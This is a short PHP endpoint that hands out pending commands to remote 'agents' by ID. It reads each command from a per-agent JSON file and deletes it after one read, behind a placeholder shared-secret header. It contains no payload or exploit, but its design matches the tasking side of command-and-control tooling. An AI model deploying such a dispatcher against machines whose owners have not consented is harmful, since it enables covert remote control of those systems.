<?php
/**
 * GET /getcommand.php?agent_id=<ID>
 * Returns the pending command for a specific agent.
 * If no agent_id is provided, returns the global/default command.
 */

header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: GET");

// --- Auth: Simple shared secret check ---
$AUTH_TOKEN = "CHANGE_ME_TO_A_STRONG_SECRET";

$headers = getallheaders();
$token = isset($headers['X-Auth-Token']) ? $headers['X-Auth-Token'] : '';

if ($token !== $AUTH_TOKEN) {
    http_response_code(403);
    echo json_encode(["status" => "error", "message" => "Unauthorized"]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(["status" => "error", "message" => "Only GET allowed"]);
    exit;
}

$agent_id = isset($_GET['agent_id']) ? preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['agent_id']) : 'default';

// Per-agent command directory
$cmd_dir = __DIR__ . "/commands/";
if (!is_dir($cmd_dir)) {
    mkdir($cmd_dir, 0700, true);
}

$cmd_file = $cmd_dir . $agent_id . ".json";

// Check for agent-specific command first, then fall back to default
if (file_exists($cmd_file)) {
    $cmd_data = json_decode(file_get_contents($cmd_file), true);
    // After reading, clear the command (one-time execution)
    unlink($cmd_file);
    echo json_encode([
        "status"  => "success",
        "command" => $cmd_data['command'] ?? '',
        "task_id" => $cmd_data['task_id'] ?? uniqid(),
        "timestamp" => date("Y-m-d H:i:s")
    ]);
} else {
    // No pending command
    echo json_encode([
        "status"  => "success",
        "command" => "",
        "task_id" => "",
        "timestamp" => date("Y-m-d H:i:s")
    ]);
}
?>
